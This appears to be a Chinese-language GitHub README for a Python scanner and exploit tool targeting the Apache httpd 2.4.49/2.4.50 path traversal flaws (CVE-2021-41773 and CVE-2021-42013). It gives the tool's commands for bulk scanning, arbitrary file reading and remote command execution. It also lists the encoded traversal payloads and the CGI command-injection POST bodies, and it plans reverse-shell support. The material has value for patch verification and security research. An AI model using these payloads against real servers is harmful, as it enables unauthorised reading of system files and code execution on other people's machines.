# apache httpd path traversal checker


## 0x00 概述

20211005，网上曝出apache httpd 2.4.49的目录穿越漏洞（cve-2021-41773），可造成任意文件读取（穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory> 默认不允许）或命令执行（rce需开启cgi，默认并不包含cgi模块）

20211008，又出了2.4.50的目录穿越（cve-2021-42013），是绕过了cve-2021-41773的修复。

漏洞详情参考：[apache httpd 2.4.49/2.4.50 目录穿越漏洞重现及分析](https://www.lsablog.com/networksec/penetration/apache-httpd-path-traversal-analysis/) 



## 0x01 快速开始

python3运行

使用帮助：python3 apache-httpd-path-traversal.py -h

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-00.png)


单url检测：python3 apache-httpd-path-traversal.py -u "http://1.2.3.4:80"

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-01.png)

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-02.png)


批量检测：python3 apache-httpd-path-traversal.py -f urls.txt -t 30 -s 3

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-03.png)


文件读取：python3 apache-httpd-path-traversal.py -u "http://1.2.3.4:80" --cdir /icons --readfile

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-04.png)


命令执行：python3 apache-httpd-path-traversal.py -u "http://1.2.3.4:80" --cdir /cgi-bin --rce

![](https://github.com/theLSA/apache-httpd-path-traversal-checker/blob/master/demo/apache-httpd-path-traversal-checker-05.png)



## 0x02 工具简介

使用urllib.request发http数据包

检测漏洞存在的依据是读取/etc/passwd判断返回数据是否含有”root:”字符串（因为大部分都是linux，所以暂时忽略检测windows）

多线程，可选择超时时间，以提高效率。

可选公共目录，rce的shell，以提供灵活性。

采用可能的公共目录列表，提高命中率。
commonDirList = ['/cgi-bin', '/icons', '/assets', '/uploads', '/img', '/image']

注意：有时候文件读取是利用icons目录，而rce要用cgi-bin目录，具体情况具体分析。

采用7种poc和2种rce的post data格式：

#cve-2021-41773
poc0 = "/.%2e/%2e%2e/%2e%2e/%2e%2e"

poc1 = "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"


#cve-2021-42013
poc2 = "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"

poc3 = "/.%%32%65/.%%32%65/.%%32%65/.%%32%65"

poc4 = "/.%%32e/.%%32e/.%%32e/.%%32e"

poc5 = "/.%2%65/.%2%65/.%2%65/.%2%65"

#rce data
rce0 = "echo;id"

rce1 = "echo Content-Type: text/plain; echo; id"

//rce的post方法改为get方法好像也行。

//payload要根据目标的apache路径层数变化跳出，一般4层够了。

//要有一个apache存在的目录，比如icons/或cgi-bin/



## 0x03 TODO

1.可能会增加对windows系统的检测。

2.可能会增加反弹shell等进一步利用。



## 0x04 反馈

[issus](https://github.com/theLSA/apache-httpd-path-traversal-checker/issues)

gmail：[lsasguge196@gmail.com](mailto:lsasguge196@gmail.com)

qq：[2894400469@qq.com](mailto:2894400469@qq.com)